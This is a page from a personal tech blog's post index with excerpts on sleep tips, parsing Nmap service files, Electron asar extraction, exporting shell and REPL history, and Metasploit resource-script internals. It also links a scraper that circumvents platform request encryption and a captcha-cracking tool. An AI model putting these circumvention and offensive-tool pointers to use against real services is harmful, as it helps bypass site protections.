<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 6 | Blog of James Brown</title>
  <meta name="author" content="James Brown">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Blog of James Brown"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/blog/atom.xml" title="Blog of James Brown" type="application/atom+xml">
  
  
    <link href="/blog/favicon.png" rel="icon">
  

  <!-- CSS -->
  <link rel="stylesheet" href="/blog/css/themes/cerulean.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/highlight-default.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/google-fonts.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/blog/css/comment.css" media="screen" type="text/css">
  <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.7/es5-sham.min.js"></script>
  <![endif]-->

  <script src="/blog/js/jquery-2.0.3.min.js"></script>
  
  
  <!-- analytics -->
  



<meta name="generator" content="Hexo 7.0.0"></head>

<body>
  <nav id="main-nav" class="navbar navbar-inverse navbar-default navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
	<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
       <a class="navbar-brand" href="/blog/">Blog of James Brown</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/blog/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/blog/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/blog/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/blog/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
    <div class="content">
      <div class="page-header page-header-inverse ">
  <h1 class="title title-inverse ">Blog of James Brown</h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		
<div class="slogan">
      <i class="fa fa-heart"></i>
      Autonomous Machines &amp; Society.
</div>


		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
        <!-- render top articles firstly -->
        
        <!-- render other articles -->
        
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-04-03 </div>
			<div class="article-title"><a href="/blog/2024/04/03/47e08cae-fa50-469b-a18c-e25ceffc4969/" title="The text provides tips on how to stay active at night by readjusting your body in bed and avoiding prolonged naps during the day. It recommends finding an appropriate place for midday rest and setting an alarm to prevent oversleeping.">Maximizing Nighttime Activity: Adjustments For Better Sleep</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<h1 id="Secret-of-staying-active-at-night"><a href="#Secret-of-staying-active-at-night" class="headerlink" title="Secret of staying active at night"></a>Secret of staying active at night</h1><p>After a day’s work you first need to rest in bed as comfortably as possible by adjusting your body gradually for a short period of time, making sure your butt is not under pressure, ahead of anything else like taking shower, and remember not to fall asleep yet. After that get off the bed and resume your operation.</p>
<p>Similarly, you do not find a way to stay active in the midday but rather to sleep somewhere and laying on the mattress above ground is the best option. Remember to set alarm in case of sleeping overtime.</p>

	
	</div>
  <a type="button" href="/blog/2024/04/03/47e08cae-fa50-469b-a18c-e25ceffc4969/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-04-03 </div>
			<div class="article-title"><a href="/blog/2024/04/03/28b80d17-53fb-48cc-adb0-1ea4a50181c6/" title="This article discusses how Nmap, a popular network scanner, improves service resolution by using `nmap-services` and `nmap-service-probes`. The process involves parsing lines, removing comments, and separating data into three components per line. This allows for more accurate port mappings and enhances the overall capabilities of Nmap in network discovery.">Nmap Service Resolution</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>There are two files we are interested in.</p>
<ul>
<li><p><code>nmap-services</code>: a list of well known services by port</p>
</li>
<li><p><code>nmap-service-probes</code>: matching rules for detecting service by response</p>
</li>
</ul>
<p>The default service to port mapping in Python <code>socket</code> module is incomplete.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find that with mlocate</span></span><br><span class="line"><span class="comment"># file_path = &#x27;/usr/share/nmap/nmap-services&#x27;</span></span><br><span class="line">file_path = <span class="string">&quot;./nmap-services&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">line_list = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> line_list:</span><br><span class="line"><span class="keyword">if</span> line.startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line"><span class="comment"># it is a comment</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># process this line</span></span><br><span class="line">content = line.split(<span class="string">&#x27;#&#x27;</span>)[<span class="number">0</span>].strip() <span class="comment"># strip away comments</span></span><br><span class="line">components = content.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># must be three.</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(components) == <span class="number">3</span>, <span class="string">f&quot;abnormal component count for content: &#x27;<span class="subst">&#123;content&#125;</span>&#x27;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/blog/2024/04/03/28b80d17-53fb-48cc-adb0-1ea4a50181c6/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-31 </div>
			<div class="article-title"><a href="/blog/2024/03/31/796d84a5-b7c0-45a3-89d7-6f10769a6837/" title="Mediacrawler is a powerful spider that employs browser-side JavaScript execution to circumvent encryption and perform valid requests. It can crawl popular short video platforms like Douyin, Kuaishou, Bilibili, and Weibo, as well as extract comments using comment spiders. Additionally, it supports Zhihu spiders with similar logic. The tool also includes a GitHub-sourced Captcha cracking tool to handle any CAPTCHAs encountered during the crawling process.">Mediacrawler</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>easyspider</p>
<p><a target="_blank" rel="noopener" href="https://github.com/NanmiCoder/MediaCrawler">Mediacrawler</a> utilizes browser side javascript execution to circumvent encryption algorithms and issues valid requests.</p>
<p>可以爬取的内容: 小红书笔记 | 评论爬虫、抖音视频 | 评论爬虫、快手视频 | 评论爬虫、B 站视频 ｜ 评论爬虫、微博帖子 ｜ 评论爬虫</p>
<p>知乎爬虫可以按照类似的逻辑进行编写</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WebSpiderUtils/verification_code">极验验证码破解</a></p>

	
	</div>
  <a type="button" href="/blog/2024/03/31/796d84a5-b7c0-45a3-89d7-6f10769a6837/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-31 </div>
			<div class="article-title"><a href="/blog/2024/03/31/8da24805-6532-40b1-bb36-23edc91406c5/" title="This article provides a solution to decompress an Electron asar file without encountering the &#39;unable to find xxx in app.asar.unpacked&#39; issue. It explains the process of extracting the file without moving it, and then offers commands for both decompression and moving the file to its desired location.">解压Electron Asar文件注意</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>解压asar的时候 注意不要移动<code>app.asar</code>的位置 解压完毕之后再移动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># to prevent &#x27;unable to find xxx in app.asar.unpacked&#x27; issue, do not move app.asar yet.</span></span><br><span class="line">asar e app.asar app</span><br><span class="line"><span class="built_in">mkdir</span> asar</span><br><span class="line"><span class="built_in">cp</span> app.asar asar</span><br><span class="line"><span class="built_in">rm</span> app.asar</span><br><span class="line"></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/blog/2024/03/31/8da24805-6532-40b1-bb36-23edc91406c5/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-31 </div>
			<div class="article-title"><a href="/blog/2024/03/31/6353e9ac-d204-48d1-a699-d84d9c43717f/" title="The article delves into exporting and visualizing command history in Xonsh, a Python-like programming language. It explores various methods for achieving this, including using the script command, %history magic, nbterm, jpterm, recording on *nix platforms, and more. Additionally, it discusses session details such as exit codes, timestamps, environment variables, and general terminal recording.">Export Repl Command History To Script File</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>xonsh has rich history per session which includes session id, command exit code, timestamp, environment variables etc.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># view input history</span></span><br><span class="line"><span class="built_in">history</span></span><br><span class="line"><span class="comment"># view history file save path</span></span><br><span class="line"><span class="built_in">history</span> file</span><br><span class="line"><span class="comment"># commit history to file</span></span><br><span class="line"><span class="built_in">history</span> flush</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>To view the commands:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;history_json_file&gt; | jq .data.cmds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>general purpose terminal recorder, available in most *nix platforms:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script &lt;record_filename&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>to render the recorded file as plain text, run the following python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyte</span><br><span class="line">typescript_path = <span class="string">&quot;mytypescript.log&quot;</span></span><br><span class="line">output_path = <span class="string">&quot;typescript_plain.log&quot;</span></span><br><span class="line"><span class="comment"># Specify the desired screen dimensions (columns x rows)</span></span><br><span class="line">columns = <span class="number">80</span> <span class="comment"># please remember the columns for godsake.</span></span><br><span class="line"><span class="comment"># if you think it would be slow, use pypy instead.</span></span><br><span class="line">rows = <span class="number">100000</span> <span class="comment"># what could go wrong now?</span></span><br><span class="line"><span class="comment"># Create a Screen object with the specified dimensions</span></span><br><span class="line">screen = pyte.Screen(columns, rows)</span><br><span class="line"><span class="comment"># Create a ByteStream to handle ANSI control codes</span></span><br><span class="line">stream = pyte.ByteStream(screen)</span><br><span class="line">typescript_bytes = <span class="built_in">open</span>(typescript_path,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Insert ANSI control codes</span></span><br><span class="line">stream.feed(typescript_bytes)</span><br><span class="line"><span class="comment"># Get the content with ANSI control codes</span></span><br><span class="line">content = screen.display</span><br><span class="line">plain_content =<span class="string">&quot;\n&quot;</span>.join(content).strip()</span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(plain_content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>for ipython one use <code>%history</code> for viewing history.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># view current session history</span></span><br><span class="line">%history</span><br><span class="line"><span class="comment"># write to file</span></span><br><span class="line">%history -f ipython_output.log</span><br><span class="line"><span class="comment"># view all history across all sessions</span></span><br><span class="line">%history -g</span><br><span class="line"><span class="comment"># view specific session history, like session 1</span></span><br><span class="line">%history <span class="number">1</span>/</span><br><span class="line"><span class="comment"># -o for showing output, -p for appending &quot;&gt;&gt;&gt;&quot; in front of input lines, -t for translating magic functions into valid python code</span></span><br><span class="line">%history -opt</span><br><span class="line"><span class="comment"># for more, type the %quickref command and type /hist&lt;Enter&gt;</span></span><br><span class="line"><span class="comment"># detailed reference can be found in %magic</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>terminal jupyter notebook</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/davidbrochart/nbterm">nbterm</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/davidbrochart/jpterm">jpterm</a> original rewrite of nbterm, with textualize</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://davidbrochart.github.io/jpterm/plugins/notebook_editor/#keybindings">keybindings</a></p>
</li>
</ul>
<hr>
<p>运行py的交互式命令行 如果想输出最近的操作 可以运行下面的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># please define &quot;history_output_path&quot; beforehand</span></span><br><span class="line"><span class="keyword">import</span> readline</span><br><span class="line"><span class="comment"># Get the total number of history items in the current session</span></span><br><span class="line">history_length = readline.get_current_history_length()</span><br><span class="line"><span class="comment"># Iterate over each history item and print the command</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(history_output_path, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, history_length + <span class="number">1</span>):</span><br><span class="line">item = readline.get_history_item(i)</span><br><span class="line"><span class="built_in">print</span>(item)</span><br><span class="line">f.write(item+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在pdb中 或者在breakpoint断点中 只能获取到当前会话的历史</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> readline; <span class="built_in">print</span>([readline.get_history_item(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(readline.get_current_history_length())])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>Hackers are good at converting arbitrary actions into scripts.</p>
<p>At every step below we need file records.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thoughs -&gt; Actions -&gt; Scripts -&gt; Programs -&gt; Systems</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Human learn from trial and error, which is the origin of every good program, and REPL can be a better place than web based jupyter notebook. So we might want to find some command line alternative to jupyter.</p>
<p>Typically we need history, command output, filter out those errorneous commands, and save the output.</p>
<hr>
<p>R has that functionality.</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># only current session history is keeped.</span></span><br><span class="line">saveHistory<span class="punctuation">(</span><span class="string">&quot;history.R&quot;</span><span class="punctuation">)</span></span><br><span class="line"><span class="comment"># view history in popup</span></span><br><span class="line">history<span class="punctuation">(</span><span class="punctuation">)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>metasploit history file location: <code>~/.msf4/history</code></p>

	
	</div>
  <a type="button" href="/blog/2024/03/31/6353e9ac-d204-48d1-a699-d84d9c43717f/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-31 </div>
			<div class="article-title"><a href="/blog/2024/03/31/a9195f8f-4cd8-4a15-ad6b-782a9b437b0a/" title="This article explains the process of loading resource scripts in Metasploit using Ruby libraries and `Rex::Script::Shell`. It also covers the usage of the Metasploit gem for vulnerability scanning through Python&#39;s pymetasploit3 package. The script interacts with the Metasploit Framework, setting up a background RPC service and loading modules.">Metasploit Scripting And More</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>you typically need to do this before importing useful metasploit ruby libraries:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LOAD_PATH</span>.push(<span class="string">&#x27;./lib&#x27;</span>)</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rex&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msfenv&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>the way metasploit loads resource script:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: lib/msf/base/sessions/command_shell.rb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_file</span>(<span class="params">full_path, args</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="title class_">File</span>.extname(full_path) == <span class="string">&#x27;.rb&#x27;</span></span><br><span class="line"><span class="title class_">Rex::Script::Shell</span>.new(<span class="variable language_">self</span>, full_path).run(args)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">load_resource(full_path) <span class="comment"># usually *.rc files</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>the <code>Shell.new</code>:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lib/rex/shell/base.rb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">args=[]</span>)</span><br><span class="line"><span class="variable language_">self</span>.args = args = args.flatten</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">eval(<span class="symbol">:</span><span class="symbol">:File</span>.read(<span class="variable language_">self</span>.path, <span class="symbol">:</span><span class="symbol">:File</span>.size(<span class="variable language_">self</span>.path)), binding )</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Interrupt</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Rex</span><span class="symbol">:</span><span class="symbol">:Script</span><span class="symbol">:</span><span class="symbol">:Completed</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line"><span class="variable language_">self</span>.error = e</span><br><span class="line"><span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>the  <code>load_resource</code>:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: lib/rex/ui/text/resource.rb</span></span><br><span class="line"><span class="comment"># -*- coding: binary -*-</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Rex</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Ui</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Text</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Resource</span></span><br><span class="line"><span class="comment"># Processes a resource script file for the console.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> path [String] Path to a resource file to run</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> [void]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_resource</span>(<span class="params">path</span>)</span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&#x27;-&#x27;</span></span><br><span class="line">resource_file = <span class="variable">$stdin</span>.read</span><br><span class="line">path = <span class="string">&#x27;stdin&#x27;</span></span><br><span class="line"><span class="keyword">elsif</span> <span class="symbol">:</span><span class="symbol">:File</span>.exist?(path)</span><br><span class="line">resource_file = <span class="symbol">:</span><span class="symbol">:File</span>.read(path)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">print_error(<span class="string">&quot;Cannot find resource script: <span class="subst">#&#123;path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># Process ERB directives first</span></span><br><span class="line">print_status <span class="string">&quot;Processing <span class="subst">#&#123;path&#125;</span> for ERB directives.&quot;</span></span><br><span class="line">erb = <span class="variable constant_">ERB</span>.new(resource_file)</span><br><span class="line">processed_resource = erb.result(binding)</span><br><span class="line">lines = processed_resource.each_line.to_a</span><br><span class="line">bindings = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> lines.length &gt; <span class="number">0</span></span><br><span class="line">line = lines.shift</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> line</span><br><span class="line">line.strip!</span><br><span class="line"><span class="keyword">next</span> <span class="keyword">if</span> line.length == <span class="number">0</span></span><br><span class="line"><span class="keyword">next</span> <span class="keyword">if</span> line =~ <span class="regexp">/^#/</span></span><br><span class="line"><span class="comment"># Pretty soon, this is going to need an XML parser :)</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> case matters for the tag and for binding names</span></span><br><span class="line"><span class="keyword">if</span> line =~ <span class="regexp">/&lt;ruby/</span></span><br><span class="line"><span class="keyword">if</span> line =~ <span class="regexp">/\s+binding=(?:&#x27;(\w+)&#x27;|&quot;(\w+)&quot;)(&gt;|\s+)/</span></span><br><span class="line">bin = (<span class="variable">$~</span>[<span class="number">1</span>] |<span class="params"></span>| <span class="variable">$~</span>[<span class="number">2</span>])</span><br><span class="line">bindings[bin] = binding <span class="keyword">unless</span> bindings.has_key? bin</span><br><span class="line">bin = bindings[bin]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">bin = binding</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> lines.length &gt; <span class="number">0</span></span><br><span class="line">line = lines.shift</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> line</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> line =~ <span class="regexp">/&lt;\/ruby&gt;/</span></span><br><span class="line">buff &lt;&lt; line</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> ! buff.empty?</span><br><span class="line">print_status(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; Ruby Code (<span class="subst">#&#123;buff.length&#125;</span> bytes)&quot;</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">eval(buff, bin)</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Interrupt</span></span><br><span class="line"><span class="keyword">raise</span> <span class="variable">$!</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">print_error(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; Ruby Error: <span class="subst">#&#123;e.<span class="keyword">class</span>&#125;</span> <span class="subst">#&#123;e&#125;</span> <span class="subst">#&#123;e.backtrace&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">print_line(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; <span class="subst">#&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">run_single(line)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>vulnerability scanners:</p>
<p><a target="_blank" rel="noopener" href="https://dradis.com/ce/">https://dradis.com/ce/</a></p>
<p>nessus</p>
<p>nexpose</p>
<p>openvas</p>
<hr>
<p><a target="_blank" rel="noopener" href="https://rubygems.org/gems/metasploit-framework">metasploit-framework</a> is a ruby gem.</p>
<hr>
<p><a target="_blank" rel="noopener" href="https://www.infosecmatter.com/metasploit-module-library/">https://www.infosecmatter.com/metasploit-module-library/</a></p>
<p><a target="_blank" rel="noopener" href="https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module">https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module</a></p>
<hr>
<p><a target="_blank" rel="noopener" href="https://github.com/hahwul/mad-metasploit">mad-metasploit</a> custom metasploit scripts</p>
<hr>
<p><a target="_blank" rel="noopener" href="https://www.offsec.com/metasploit-unleashed/">metasploit unleashed</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.metasploit.com/">official metasploit documentation</a></p>
<hr>
<p>metasploit has enabled ssl by default. http will not work.</p>
<p>install package:</p>
